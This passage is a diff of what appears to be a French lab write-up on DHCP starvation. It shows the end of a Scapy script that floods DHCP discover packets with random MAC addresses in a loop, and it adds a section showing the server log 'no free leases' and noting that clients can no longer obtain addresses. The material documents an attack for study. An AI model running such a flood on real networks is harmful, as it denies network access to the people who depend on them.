@@ -228,6 +228,13 @@ dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC()) \
 
 sendp(dhcp_discover,iface='wlp4s0',loop=1,verbose=1)
 ```
+**Effet de l'attaque**
+Après avoir lancé le script :
+•	Le serveur DHCP est à court d'adresses disponibles :
+
+```DHCPDISCOVER from 64:38:3a:61:38:3a via enp0s3 network 10.1.1.0/24: no free leases ```
+
+•	Les machines ne peuvent plus obtenir d’IP avec dhcp.
 
 
 
